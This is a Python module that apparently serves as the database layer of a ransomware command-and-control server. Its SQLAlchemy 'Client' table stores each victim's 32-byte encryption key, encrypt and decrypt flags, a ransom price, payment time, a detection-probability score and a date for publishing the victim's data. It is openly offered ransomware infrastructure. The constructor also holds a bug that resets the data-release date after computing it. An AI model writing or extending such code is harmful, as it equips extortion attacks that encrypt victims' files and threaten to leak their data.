"""Database

A module for a databse that can be used for a command and control server.

.. code:: python

    from sqlalchemy.orm import Session
    Client, engine = connect_to_database()
    if __name__ == "__main__":
        with Session(engine) as session:
            session.add(Client()) # create a client
            print(session.query(Client).first())
"""

import logging
import os.path
import sys
from datetime import datetime as dt
from datetime import timedelta
from uuid import uuid4

import sqlalchemy
import sqlalchemy.orm
from Crypto.Random import get_random_bytes
from sqlalchemy import Column, create_engine
from sqlalchemy.orm import Session, declarative_base

DEFAULT_TIMEDELTA_TILL_DATA_PUBLICATION: timedelta = timedelta(days=10)
DEFAULT_DECRYPTION_PRICE = 1000

logger = logging.getLogger(__name__)


def iso8601() -> str:
    """Current time as a string

    Returns:
        str: The current time in the format `YYYY-MM-DD HH:MM:SS`
    """
    return dt.now().isoformat(sep=" ", timespec="seconds")


def client_class_factory(base: declarative_base):
    """Client class to used as a mapping to a database.

    Args:
        base (declarative_base): Mapping style class to be used.

    Raises:
        ValueError: If the key is not 32 bytes long.

    Returns:
        _type_: Client class mapping.
    """
    class Client(base):
        __tablename__ = "client"
        guid = Column(sqlalchemy.String(36), primary_key=True)
        info = Column(sqlalchemy.String(255))
        probability_of_detection = Column(sqlalchemy.Integer, default=0)
        encrypt = Column(sqlalchemy.Boolean(), default=True)
        encrypted_at = Column(sqlalchemy.DateTime())
        payed_at = Column(sqlalchemy.DateTime())
        decrypt = Column(sqlalchemy.Boolean(), default=False)
        key = Column(sqlalchemy.types.LargeBinary(32))
        logo = Column(sqlalchemy.String(255))
        description = Column(sqlalchemy.String(255))
        release_date_of_data = Column(
            sqlalchemy.DateTime(),
            default=dt.fromisoformat(iso8601())
            + DEFAULT_TIMEDELTA_TILL_DATA_PUBLICATION,
        )
        ransom = Column(sqlalchemy.Float(), default=DEFAULT_DECRYPTION_PRICE)
        # Future: add payment address

        def __init__(
            self,
            guid: str = "",
            info: str = "",
            probability_of_detection: int = 0,
            encrypt: bool = True,
            encrypted_at: dt = None,
            payed_at: str = None,
            decrypt: bool = False,
            key: bytes = b"",
            logo: str = "",
            description: str = "",
            release_date_of_data: dt = None,
        ) -> None:
            if guid == "":
                self.guid = str(uuid4())
            else:
                self.guid = guid

            self.info = info
            self.probability_of_detection = probability_of_detection
            self.encrypt = encrypt
            self.decrypt = decrypt

            if encrypted_at is None:
                self.encrypted_at = dt.fromisoformat(iso8601())
            else:
                self.encrypted_at = encrypted_at

            if key == b"":
                self.key = get_random_bytes(32)
            else:
                if len(key) != 32:
                    raise ValueError("Key size must be 32 bytes.")
                self.key = key

            if payed_at is None:
                self.payed_at = None
            else:
                self.payed_at = dt.fromisoformat(payed_at)

            if release_date_of_data is None:
                self.release_date_of_data = (
                    dt.fromisoformat(iso8601())
                    + DEFAULT_TIMEDELTA_TILL_DATA_PUBLICATION
                )
            else:
                self.release_date_of_data = release_date_of_data

            self.logo = logo
            self.description = description
            self.release_date_of_data = release_date_of_data

            logger.debug("Creating: %s", self)

        def serialize(self) -> dict:
            """Get a dict of the client attributes.

            Returns:
                dict: Client attributes.
            """
            return self.__dict__

        def __repr__(self) -> str:
            """Get a string representation of the client.

            Returns:
                str: Represents the client (guid).
            """
            return f"Client(guid={self.guid})"

        def __str__(self) -> str:
            """Get a string representation of the client.

            Returns:
                str: Represents the client (guid).
            """
            return f"Client(guid={self.guid})"

    return Client


def connect_to_database(database=r"database.db"):
    """Interact with the database.

    If the database does not exist, it is created.

    Example:
        Client, engine = connect_to_database()

    Args:
        database (regexp, optional): Location of the database file. Defaults to r"database.db".

    Returns:
        _type_: client class, engine
    """
    db_exists = os.path.isfile(database)
    if db_exists:
        logger.info("Database already exists: %s", database)
    else:
        logger.info("Database missing ... creating database: %s", database)
    Base = declarative_base()

    client_model = client_class_factory(Base)

    engine = create_engine(f"sqlite:///{database}")
    Base.metadata.create_all(engine)

    return client_model, engine
